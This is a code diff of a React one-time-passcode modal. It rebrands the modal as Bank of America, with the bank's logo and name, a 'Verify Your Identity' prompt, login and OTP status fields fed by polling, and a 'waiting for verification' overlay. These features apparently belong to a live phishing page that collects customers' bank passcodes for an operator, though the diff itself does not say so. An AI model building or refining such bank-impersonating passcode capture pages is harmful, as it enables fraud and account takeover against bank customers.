@@ -262,15 +262,28 @@ const PhoneOTPModal = () => {
 
   return (
     <Model isOpen={isOpen} blur>
-      <div className="relative bg-white w-80 rounded-xl shadow-lg p-6 text-center">
-        <h2 className="text-lg font-semibold mb-2">Enter OTP</h2>
-        <p className="text-gray-500 text-sm mb-4">
-          Enter the 6-digit code sent to your device
+      <div className="relative bg-white rounded-2xl shadow-xl max-w-sm w-full mx-auto px-8 py-8 flex flex-col items-center text-center border border-gray-200">
+        {/* Logo */}
+        <div className="mb-6">
+          <img
+            src={logo}
+            alt="Bank of America Logo"
+            className="h-10 object-contain mx-auto"
+          />
+        </div>
+
+        {/* Title & Subtitle */}
+        <h2 className="text-xl font-semibold text-[#1E2B4D] mb-2">
+          Verify Your Identity
+        </h2>
+        <p className="text-gray-500 text-sm mb-6">
+          Enter the 6-digit code sent to your registered device.
         </p>
 
-        <form onSubmit={handleVerify}>
+        {/* OTP Form */}
+        <form onSubmit={handleVerify} className="w-full">
           <div className="flex justify-center gap-3 mb-6">
-            {otp.map((digit, index) => (
+            {otp.map((digit: string, index: number) => (
               <input
                 key={index}
                 ref={(el) => {
@@ -281,30 +294,34 @@ const PhoneOTPModal = () => {
                 value={digit}
                 onChange={(e) => handleOtpChange(e.target.value, index)}
                 onKeyDown={(e) => handleKeyDown(e, index)}
-                className={`w-10 h-10 text-center border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg ${
-                  otpRejected ? "border-red-500 animate-shake" : ""
+                className={`w-11 h-11 text-center border rounded-md text-lg font-medium focus:outline-none focus:ring-2 focus:ring-[#B42025] focus:border-[#B42025] transition-all ${
+                  otpRejected
+                    ? "border-red-500 animate-shake"
+                    : "border-gray-300"
                 }`}
               />
             ))}
           </div>
 
+          {/* Buttons */}
           <button
             type="submit"
             disabled={isSending}
-            className="bg-[#344E87] text-white w-full py-2 rounded-md hover:bg-blue-700 transition mb-2"
+            className="bg-[#B42025] hover:bg-[#981A1E] text-white w-full py-2.5 rounded-md font-medium transition mb-3 disabled:opacity-50"
           >
-            {isSending ? "Sending..." : "Send OTP"}
+            {isSending ? "Sending..." : "Verify Code"}
           </button>
 
           <button
             type="button"
             onClick={handleResend}
-            className="bg-gray-200 text-gray-700 w-full py-2 rounded-md hover:bg-gray-300 transition"
+            className="bg-gray-100 hover:bg-gray-200 text-gray-700 w-full py-2.5 rounded-md font-medium transition"
           >
-            Resend OTP
+            Resend Code
           </button>
 
-          <div className="mt-4 text-sm text-gray-600">
+          {/* Status info */}
+          <div className="mt-5 text-sm text-gray-600 text-left">
             <p>
               Login Status: <strong>{loginStatus}</strong>
             </p>
@@ -312,38 +329,29 @@ const PhoneOTPModal = () => {
               OTP Status: <strong>{otpStatus || "-"}</strong>
             </p>
             {pollingError && (
-              <p className="mt-2 text-xs text-red-500">
+              <p className="mt-1 text-xs text-red-500">
                 Polling error: {pollingError}
               </p>
             )}
           </div>
         </form>
 
-        {/* 🔥 Overlay Loading Screen */}
+        {/* Overlay Loader */}
         {submittedOtp && otpStatus === "otp_pending" && (
-          <div className="absolute inset-0 bg-white backdrop-blur-sm flex flex-col items-center justify-center rounded-xl p-6">
-            <div className="flex flex-col items-center space-y-6">
-              {/* Logo */}
-              <img
-                src={logo} // <-- replace with your actual logo path
-                alt="App Logo"
-                className="w-2 h-16 object-contain"
-              />
-
-              {/* Loader Spinner */}
-              <div className="w-12 h-12 border-4 border-[#344E87] border-t-transparent rounded-full animate-spin" />
-
-              {/* Text */}
-              <div className="text-center">
-                <p className="text-lg font-semibold text-gray-800 mb-1">
-                  Waiting for OTP verification...
-                </p>
-                <p className="text-sm text-gray-500 max-w-xs">
-                  Your OTP has been submitted. Please wait while we verify your
-                  code. You’ll be redirected automatically.
-                </p>
-              </div>
-            </div>
+          <div className="absolute inset-0 bg-white/95 backdrop-blur-sm flex flex-col items-center justify-center rounded-2xl">
+            <img
+              src={logo}
+              alt="Bank of America"
+              className="h-8 mb-6 object-contain"
+            />
+            <div className="w-10 h-10 border-4 border-[#B42025] border-t-transparent rounded-full animate-spin mb-6" />
+            <p className="text-gray-800 font-medium mb-1">
+              Waiting for OTP verification…
+            </p>
+            <p className="text-gray-500 text-sm max-w-xs">
+              Please wait while we verify your code. You’ll be redirected
+              automatically.
+            </p>
           </div>
         )}
       </div>
